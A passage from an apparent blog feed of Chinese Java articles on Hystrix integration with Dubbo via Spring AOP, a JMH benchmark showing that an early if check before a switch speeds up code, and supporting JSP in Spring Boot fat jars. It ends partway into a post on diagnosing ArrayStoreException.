<p>传统spring annotation应用的配置其实也很简单，和spring boot应用不同的是：</p>
<ol>
<li>显式配置Spring AOP支持：<code>@EnableAspectJAutoProxy</code></li>
<li>显式通过<code>@Configuration</code>配置<code>HystrixCommandAspect</code> Bean。</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableDubbo</span>(scanBasePackages = <span class="string">"com.alibaba.dubbo.samples.annotation.action"</span>)</span><br><span class="line"><span class="meta">@PropertySource</span>(<span class="string">"classpath:/spring/dubbo-consumer.properties"</span>)</span><br><span class="line"><span class="meta">@ComponentScan</span>(value = &#123;<span class="string">"com.alibaba.dubbo.samples.annotation.action"</span>&#125;)</span><br><span class="line"><span class="meta">@EnableAspectJAutoProxy</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConsumerConfiguration</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> HystrixCommandAspect <span class="title">hystrixCommandAspect</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> HystrixCommandAspect();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Hystrix集成Spring-AOP原理"><a href="#Hystrix集成Spring-AOP原理" class="headerlink" title="Hystrix集成Spring AOP原理"></a>Hystrix集成Spring AOP原理</h2><p>在上面的例子里可以看到，Hystrix对Spring的集成是通过Spring AOP来实现的。下面简单分析下实现。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Aspect</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HystrixCommandAspect</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Pointcut</span>(<span class="string">"@annotation(com.netflix.hystrix.contrib.javanica.annotation.HystrixCommand)"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hystrixCommandAnnotationPointcut</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Pointcut</span>(<span class="string">"@annotation(com.netflix.hystrix.contrib.javanica.annotation.HystrixCollapser)"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hystrixCollapserAnnotationPointcut</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Around</span>(<span class="string">"hystrixCommandAnnotationPointcut() || hystrixCollapserAnnotationPointcut()"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">methodsAnnotatedWithHystrixCommand</span><span class="params">(<span class="keyword">final</span> ProceedingJoinPoint joinPoint)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        Method method = getMethodFromTarget(joinPoint);</span><br><span class="line">        Validate.notNull(method, <span class="string">"failed to get method from joinPoint: %s"</span>, joinPoint);</span><br><span class="line">        <span class="keyword">if</span> (method.isAnnotationPresent(HystrixCommand<span class="class">.<span class="keyword">class</span>) &amp;&amp; <span class="title">method</span>.<span class="title">isAnnotationPresent</span>(<span class="title">HystrixCollapser</span>.<span class="title">class</span>)) </span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"method cannot be annotated with HystrixCommand and HystrixCollapser "</span> +</span><br><span class="line">                    <span class="string">"annotations at the same time"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        MetaHolderFactory metaHolderFactory = META_HOLDER_FACTORY_MAP.get(HystrixPointcutType.of(method));</span><br><span class="line">        MetaHolder metaHolder = metaHolderFactory.create(joinPoint);</span><br><span class="line">        HystrixInvokable invokable = HystrixCommandFactory.getInstance().create(metaHolder);</span><br><span class="line">        ExecutionType executionType = metaHolder.isCollapserAnnotationPresent() ?</span><br><span class="line">                metaHolder.getCollapserExecutionType() : metaHolder.getExecutionType();</span><br><span class="line"></span><br><span class="line">        Object result;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!metaHolder.isObservable()) &#123;</span><br><span class="line">                result = CommandExecutor.execute(invokable, executionType, metaHolder);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                result = executeObservable(invokable, executionType, metaHolder);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (HystrixBadRequestException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> e.getCause() != <span class="keyword">null</span> ? e.getCause() : e;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (HystrixRuntimeException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> hystrixRuntimeExceptionToThrowable(metaHolder, e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<ol>
<li><code>HystrixCommandAspect</code>里定义了两个注解的AspectJ Pointcut：<code>@HystrixCommand</code>, <code>@HystrixCollapser</code>。所有带这两个注解的spring bean都会经过AOP处理</li>
<li>在<code>@Around</code> AOP处理函数里，可以看到Hystrix会创建出<code>HystrixInvokable</code>，再通过<code>CommandExecutor</code>来执行</li>
</ol>
<h2 id="spring-cloud-starter-netflix-hystrix的代码分析"><a href="#spring-cloud-starter-netflix-hystrix的代码分析" class="headerlink" title="spring-cloud-starter-netflix-hystrix的代码分析"></a>spring-cloud-starter-netflix-hystrix的代码分析</h2><ol>
<li><p><code>@EnableHystrix</code> 引入了<code>@EnableCircuitBreaker</code>，<code>@EnableCircuitBreaker</code>引入了<code>EnableCircuitBreakerImportSelector</code></p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableCircuitBreaker</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> EnableHystrix &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Import</span>(EnableCircuitBreakerImportSelector<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class"><span class="title">public</span> @<span class="title">interface</span> <span class="title">EnableCircuitBreaker</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>EnableCircuitBreakerImportSelector</code>继承了<code>SpringFactoryImportSelector&lt;EnableCircuitBreaker&gt;</code>，使spring加载<code>META-INF/spring.factories</code>里的<code>EnableCircuitBreaker</code>声明的配置</p>
<p> 在<code>META-INF/spring.factories</code>里可以找到下面的配置，也就是引入了<code>HystrixCircuitBreakerConfiguration</code>。</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">org.springframework.cloud.client.circuitbreaker.EnableCircuitBreaker=\</span><br><span class="line">org.springframework.cloud.netflix.hystrix.HystrixCircuitBreakerConfiguration</span><br></pre></td></tr></table></figure>
</li>
<li><p>在<code>HystrixCircuitBreakerConfiguration</code>里可以发现创建了<code>HystrixCommandAspect</code></p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HystrixCircuitBreakerConfiguration</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> HystrixCommandAspect <span class="title">hystrixCommandAspect</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> HystrixCommandAspect();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>可见<code>spring-cloud-starter-netflix-hystrix</code>实际上也是创建了<code>HystrixCommandAspect</code>来集成Hystrix。</p>
<p>另外<code>spring-cloud-starter-netflix-hystrix</code>里还有metrics, health, dashboard等集成。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>对于dubbo provider的<code>@Service</code>是一个spring bean，直接在上面配置<code>@HystrixCommand</code>即可</li>
<li><p>对于dubbo consumer的<code>@Reference</code>，可以通过加一层简单的spring method包装，配置<code>@HystrixCommand</code>即可</p>
</li>
<li><p>Hystrix本身提供<code>HystrixCommandAspect</code>来集成Spring AOP，配置了<code>@HystrixCommand</code>和<code>@HystrixCollapser</code>的spring method都会被Hystrix处理</p>
</li>
</ul>
<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><ul>
<li><a href="https://github.com/Netflix/Hystrix" target="_blank" rel="noopener">https://github.com/Netflix/Hystrix</a></li>
<li><a href="https://github.com/apache/incubator-dubbo" target="_blank" rel="noopener">https://github.com/apache/incubator-dubbo</a></li>
<li><a href="http://start.dubbo.io/" target="_blank" rel="noopener">http://start.dubbo.io/</a></li>
<li><a href="https://cloud.spring.io/spring-cloud-netflix/single/spring-cloud-netflix.html#_circuit_breaker_hystrix_clients" target="_blank" rel="noopener">https://cloud.spring.io/spring-cloud-netflix/single/spring-cloud-netflix.html#_circuit_breaker_hystrix_clients</a></li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>spring-boot</tag>
        <tag>spring</tag>
        <tag>dubbo</tag>
        <tag>hystrix</tag>
      </tags>
  </entry>
  <entry>
    <title>优化技巧：提前if判断帮助CPU分支预测</title>
    <url>/optimization-tip-if-vs-switch/</url>
    <content><![CDATA[<h2 id="分支预测"><a href="#分支预测" class="headerlink" title="分支预测"></a>分支预测</h2><p>在stackoverflow上有一个非常有名的问题：<a href="https://stackoverflow.com/questions/11227809/why-is-it-faster-to-process-a-sorted-array-than-an-unsorted-array" target="_blank" rel="noopener">为什么处理有序数组要比非有序数组快？</a>，可见分支预测对代码运行效率有非常大的影响。</p>
<p>现代CPU都支持分支预测(branch prediction)和指令流水线(instruction pipeline)，这两个结合可以极大提高CPU效率。对于像简单的if跳转，CPU是可以比较好地做分支预测的。但是对于switch跳转，CPU则没有太多的办法。switch本质上是据索引，从地址数组里取地址再跳转。</p>
<p>要提高代码执行效率，一个重要的原则就是尽量避免CPU把流水线清空，那么提高分支预测的成功率就非常重要。</p>
<p>那么对于代码里，如果某个switch分支概率很高，是否可以考虑代码层面帮CPU把判断提前，来提高代码执行效率呢？</p>
<h2 id="Dubbo里ChannelEventRunnable的switch判断"><a href="#Dubbo里ChannelEventRunnable的switch判断" class="headerlink" title="Dubbo里ChannelEventRunnable的switch判断"></a>Dubbo里ChannelEventRunnable的switch判断</h2><p>在<code>ChannelEventRunnable</code>里有一个switch来判断channel state，然后做对应的逻辑：<a href="https://github.com/hengyunabc/incubator-dubbo/blob/dubbo-2.6.1/dubbo-remoting/dubbo-remoting-api/src/main/java/com/alibaba/dubbo/remoting/transport/dispatcher/ChannelEventRunnable.java#L54" target="_blank" rel="noopener">查看</a></p>
<p>一个channel建立起来之后，超过99.9%情况它的state都是<code>ChannelState.RECEIVED</code>，那么可以考虑把这个判断提前。</p>
<h2 id="benchmark验证"><a href="#benchmark验证" class="headerlink" title="benchmark验证"></a>benchmark验证</h2><p>下面通过jmh来验证下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBenchMarks</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">enum</span> ChannelState &#123;</span><br><span class="line">		CONNECTED, DISCONNECTED, SENT, RECEIVED, CAUGHT</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@State</span>(Scope.Benchmark)</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">ExecutionPlan</span> </span>&#123;</span><br><span class="line">		<span class="meta">@Param</span>(&#123; <span class="string">"1000000"</span> &#125;)</span><br><span class="line">		<span class="keyword">public</span> <span class="keyword">int</span> size;</span><br><span class="line">		<span class="keyword">public</span> ChannelState[] states = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">		<span class="meta">@Setup</span></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUp</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			ChannelState[] values = ChannelState.values();</span><br><span class="line">			states = <span class="keyword">new</span> ChannelState[size];</span><br><span class="line">			Random random = <span class="keyword">new</span> Random(<span class="keyword">new</span> Date().getTime());</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">				<span class="keyword">int</span> nextInt = random.nextInt(<span class="number">1000000</span>);</span><br><span class="line">				<span class="keyword">if</span> (nextInt &gt; <span class="number">100</span>) &#123;</span><br><span class="line">					states[i] = ChannelState.RECEIVED;</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					states[i] = values[nextInt % values.length];</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Fork</span>(value = <span class="number">5</span>)</span><br><span class="line">	<span class="meta">@Benchmark</span></span><br><span class="line">	<span class="meta">@BenchmarkMode</span>(Mode.Throughput)</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">benchSiwtch</span><span class="params">(ExecutionPlan plan, Blackhole bh)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; plan.size; ++i) &#123;</span><br><span class="line">			<span class="keyword">switch</span> (plan.states[i]) &#123;</span><br><span class="line">			<span class="keyword">case</span> CONNECTED:</span><br><span class="line">				result += ChannelState.CONNECTED.ordinal();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> DISCONNECTED:</span><br><span class="line">				result += ChannelState.DISCONNECTED.ordinal();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> SENT:</span><br><span class="line">				result += ChannelState.SENT.ordinal();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> RECEIVED:</span><br><span class="line">				result += ChannelState.RECEIVED.ordinal();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> CAUGHT:</span><br><span class="line">				result += ChannelState.CAUGHT.ordinal();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		bh.consume(result);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Fork</span>(value = <span class="number">5</span>)</span><br><span class="line">	<span class="meta">@Benchmark</span></span><br><span class="line">	<span class="meta">@BenchmarkMode</span>(Mode.Throughput)</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">benchIfAndSwitch</span><span class="params">(ExecutionPlan plan, Blackhole bh)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; plan.size; ++i) &#123;</span><br><span class="line">			ChannelState state = plan.states[i];</span><br><span class="line">			<span class="keyword">if</span> (state == ChannelState.RECEIVED) &#123;</span><br><span class="line">				result += ChannelState.RECEIVED.ordinal();</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">switch</span> (state) &#123;</span><br><span class="line">				<span class="keyword">case</span> CONNECTED:</span><br><span class="line">					result += ChannelState.CONNECTED.ordinal();</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> SENT:</span><br><span class="line">					result += ChannelState.SENT.ordinal();</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> DISCONNECTED:</span><br><span class="line">					result += ChannelState.DISCONNECTED.ordinal();</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> CAUGHT:</span><br><span class="line">					result += ChannelState.CAUGHT.ordinal();</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		bh.consume(result);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>benchSiwtch里是纯switch判断</li>
<li>benchIfAndSwitch 里用一个if提前判断state是否<code>ChannelState.RECEIVED</code></li>
</ul>
<p>benchmark结果是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Result &quot;io.github.hengyunabc.jmh.TestBenchMarks.benchSiwtch&quot;:</span><br><span class="line">  576.745 ±(99.9%) 6.806 ops/s [Average]</span><br><span class="line">  (min, avg, max) = (490.348, 576.745, 618.360), stdev = 20.066</span><br><span class="line">  CI (99.9%): [569.939, 583.550] (assumes normal distribution)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Run complete. Total time: 00:06:48</span><br><span class="line"></span><br><span class="line">Benchmark                         (size)   Mode  Cnt     Score    Error  Units</span><br><span class="line">TestBenchMarks.benchIfAndSwitch  1000000  thrpt  100  1535.867 ± 61.212  ops/s</span><br><span class="line">TestBenchMarks.benchSiwtch       1000000  thrpt  100   576.745 ±  6.806  ops/s</span><br></pre></td></tr></table></figure>
<p>可以看到提前if判断的确提高了代码效率，这种技巧可以放在性能要求严格的地方。</p>
<p>Benchmark代码：<a href="https://github.com/hengyunabc/jmh-demo" target="_blank" rel="noopener">https://github.com/hengyunabc/jmh-demo</a></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>switch对于CPU来说难以做分支预测</li>
<li>某些switch条件如果概率比较高，可以考虑单独提前if判断，充分利用CPU的分支预测机制</li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>dubbo</tag>
        <tag>cpu</tag>
        <tag>优化</tag>
      </tags>
  </entry>
  <entry>
    <title>深入Spring Boot：实现对Fat Jar jsp的支持</title>
    <url>/spring-boot-fat-jar-jsp-sample/</url>
    <content><![CDATA[<h2 id="spring-boot-对于jsp支持的限制"><a href="#spring-boot-对于jsp支持的限制" class="headerlink" title="spring boot 对于jsp支持的限制"></a>spring boot 对于jsp支持的限制</h2><p>对于jsp的支持，Spring Boot官方只支持了war的打包方式，不支持fat jar。参考官方文档： <a href="https://docs.spring.io/spring-boot/docs/current/reference/html/boot-features-developing-web-applications.html#boot-features-jsp-limitations" target="_blank" rel="noopener">https://docs.spring.io/spring-boot/docs/current/reference/html/boot-features-developing-web-applications.html#boot-features-jsp-limitations</a></p>
<p>这里spring boot官方说是tomcat的问题，实际上是spring boot自己改变了打包格式引起的。参考之前的文章：<a href="http://hengyunabc.github.io/spring-boot-classloader/#spring-boot-1-3-%E5%92%8C-1-4-%E7%89%88%E6%9C%AC%E7%9A%84%E5%8C%BA%E5%88%AB">http://hengyunabc.github.io/spring-boot-classloader/#spring-boot-1-3-%E5%92%8C-1-4-%E7%89%88%E6%9C%AC%E7%9A%84%E5%8C%BA%E5%88%AB</a></p>
<p>原来的结构之下，tomcat是可以扫描到fat jar里的<code>META-INF/resources</code>目录下面的资源的。在增加了<code>BOOT-INF/classes</code>之后，则tomcat扫描不到了。</p>
<p>那么怎么解决这个问题呢？下面给出一种方案，来实现对spring boot fat jar/exploded directory的jsp的支持。</p>
<h2 id="个性化配置tomcat，把BOOT-INF-classes-加入tomcat的ResourceSet"><a href="#个性化配置tomcat，把BOOT-INF-classes-加入tomcat的ResourceSet" class="headerlink" title="个性化配置tomcat，把BOOT-INF/classes 加入tomcat的ResourceSet"></a>个性化配置tomcat，把BOOT-INF/classes 加入tomcat的ResourceSet</h2><p>在tomcat里，所有扫描到的资源都会放到所谓的<code>ResourceSet</code>里。比如servlet 3规范里的应用jar包的<code>META-INF/resources</code>就是一个<code>ResourceSet</code>。</p>
<p>现在需要想办法把spring boot打出来的fat jar的<code>BOOT-INF/classes</code>目录加到<code>ResourceSet</code>里。</p>
<p>下面通过实现tomcat的 <code>LifecycleListener</code>接口，在<code>Lifecycle.CONFIGURE_START_EVENT</code>事件里，获取到<code>BOOT-INF/classes</code>的URL，再把这个URL加入到<code>WebResourceSet</code>里。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Add main class fat jar/exploded directory into tomcat ResourceSet.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> hengyunabc 2017-07-29</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StaticResourceConfigurer</span> <span class="keyword">implements</span> <span class="title">LifecycleListener</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> Context context;</span><br><span class="line"></span><br><span class="line">	StaticResourceConfigurer(Context context) &#123;</span><br><span class="line">		<span class="keyword">this</span>.context = context;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">lifecycleEvent</span><span class="params">(LifecycleEvent event)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (event.getType().equals(Lifecycle.CONFIGURE_START_EVENT)) &#123;</span><br><span class="line">			URL location = <span class="keyword">this</span>.getClass().getProtectionDomain().getCodeSource().getLocation();</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (ResourceUtils.isFileURL(location)) &#123;</span><br><span class="line">				<span class="comment">// when run as exploded directory</span></span><br><span class="line">				String rootFile = location.getFile();</span><br><span class="line">				<span class="keyword">if</span> (rootFile.endsWith(<span class="string">"/BOOT-INF/classes/"</span>)) &#123;</span><br><span class="line">					rootFile = rootFile.substring(<span class="number">0</span>, rootFile.length() - <span class="string">"/BOOT-INF/classes/"</span>.length() + <span class="number">1</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span> (!<span class="keyword">new</span> File(rootFile, <span class="string">"META-INF"</span> + File.separator + <span class="string">"resources"</span>).isDirectory()) &#123;</span><br><span class="line">					<span class="keyword">return</span>;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">try</span> &#123;</span><br><span class="line">					location = <span class="keyword">new</span> File(rootFile).toURI().toURL();</span><br><span class="line">				&#125; <span class="keyword">catch</span> (MalformedURLException e) &#123;</span><br><span class="line">					<span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Can not add tomcat resources"</span>, e);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			String locationStr = location.toString();</span><br><span class="line">			<span class="keyword">if</span> (locationStr.endsWith(<span class="string">"/BOOT-INF/classes!/"</span>)) &#123;</span><br><span class="line">				<span class="comment">// when run as fat jar</span></span><br><span class="line">				locationStr = locationStr.substring(<span class="number">0</span>, locationStr.length() - <span class="string">"/BOOT-INF/classes!/"</span>.length() + <span class="number">1</span>);</span><br><span class="line">				<span class="keyword">try</span> &#123;</span><br><span class="line">					location = <span class="keyword">new</span> URL(locationStr);</span><br><span class="line">				&#125; <span class="keyword">catch</span> (MalformedURLException e) &#123;</span><br><span class="line">					<span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Can not add tomcat resources"</span>, e);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">this</span>.context.getResources().createWebResourceSet(ResourceSetType.RESOURCE_JAR, <span class="string">"/"</span>, location,</span><br><span class="line">					<span class="string">"/META-INF/resources"</span>);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>为了让spring boot embedded tomcat加载这个 <code>StaticResourceConfigurer</code>，还需要一个<code>EmbeddedServletContainerCustomizer</code>的配置：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ConditionalOnProperty</span>(name = <span class="string">"tomcat.staticResourceCustomizer.enabled"</span>, matchIfMissing = <span class="keyword">true</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TomcatConfiguration</span> </span>&#123;</span><br><span class="line">	<span class="meta">@Bean</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> EmbeddedServletContainerCustomizer <span class="title">staticResourceCustomizer</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">new</span> EmbeddedServletContainerCustomizer() &#123;</span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">customize</span><span class="params">(ConfigurableEmbeddedServletContainer container)</span> </span>&#123;</span><br><span class="line">				<span class="keyword">if</span> (container <span class="keyword">instanceof</span> TomcatEmbeddedServletContainerFactory) &#123;</span><br><span class="line">					((TomcatEmbeddedServletContainerFactory) container)</span><br><span class="line">							.addContextCustomizers(<span class="keyword">new</span> TomcatContextCustomizer() &#123;</span><br><span class="line">								<span class="meta">@Override</span></span><br><span class="line">								<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">customize</span><span class="params">(Context context)</span> </span>&#123;</span><br><span class="line">									context.addLifecycleListener(<span class="keyword">new</span> StaticResourceConfigurer(context));</span><br><span class="line">								&#125;</span><br><span class="line">							&#125;);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样子的话，spring boot就可以支持fat jar里的jsp资源了。</p>
<p>demo地址： <a href="https://github.com/hengyunabc/spring-boot-fat-jar-jsp-sample" target="_blank" rel="noopener">https://github.com/hengyunabc/spring-boot-fat-jar-jsp-sample</a></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>spring boot改变了打包结构，导致tomcat没有办法扫描到fat jar里的<code>/BOOT-INF/classes</code></li>
<li>通过一个<code>StaticResourceConfigurer</code>把fat jar里的<code>/BOOT-INF/classes</code>加到tomcat的<code>ResourceSet</code>来解决问题</li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>spring-boot</tag>
        <tag>spring</tag>
        <tag>tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title>深入Spring Boot：怎样排查 java.lang.ArrayStoreException</title>
    <url>/spring-boot-ArrayStoreException/</url>
    <content><![CDATA[<h2 id="java-lang-ArrayStoreException-分析"><a href="#java-lang-ArrayStoreException-分析" class="headerlink" title="java.lang.ArrayStoreException 分析"></a>java.lang.ArrayStoreException 分析</h2><p>这个demo来说明怎样排查一个spring boot 1应用升级到spring boot 2时可能出现的<code>java.lang.ArrayStoreException</code>。</p>
<p>demo地址：<a href="https://github.com/hengyunabc/spring-boot-inside/tree/master/demo-ArrayStoreException" target="_blank" rel="noopener">https://github.com/hengyunabc/spring-boot-inside/tree/master/demo-ArrayStoreException</a></p>
<p>demo里有两个模块，<code>springboot1-starter</code>和<code>springboot2-demo</code>。</p>
<p>在<code>springboot1-starter</code>模块里，是一个简单的<code>HealthIndicator</code>实现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyHealthIndicator</span> <span class="keyword">extends</span> <span class="title">AbstractHealthIndicator</span> </span>&#123;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doHealthCheck</span><span class="params">(Builder builder)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		builder.status(Status.UP);</span><br><span class="line">		builder.withDetail(<span class="string">"hello"</span>, <span class="string">"world"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@AutoConfigureBefore</span>(EndpointAutoConfiguration<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class">@<span class="title">AutoConfigureAfter</span>(<span class="title">HealthIndicatorAutoConfiguration</span>.<span class="title">class</span>)</span></span><br><span class="line"><span class="class">@<span class="title">ConditionalOnClass</span>(<span class="title">value</span> </span>= &#123; HealthIndicator<span class="class">.<span class="keyword">class</span> &#125;)</span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">class</span> <span class="title">MyHealthIndicatorAutoConfiguration</span> </span>&#123;</span><br><span class="line">	<span class="meta">@Bean</span></span><br><span class="line">	<span class="meta">@ConditionalOnMissingBean</span>(MyHealthIndicator<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line">	@ConditionalOnEnabledHealthIndicator("my")</span><br><span class="line">	<span class="function"><span class="keyword">public</span> MyHealthIndicator <span class="title">myHealthIndicator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">new</span> MyHealthIndicator();</span><br><span class="line">	&#125;</span><br><span 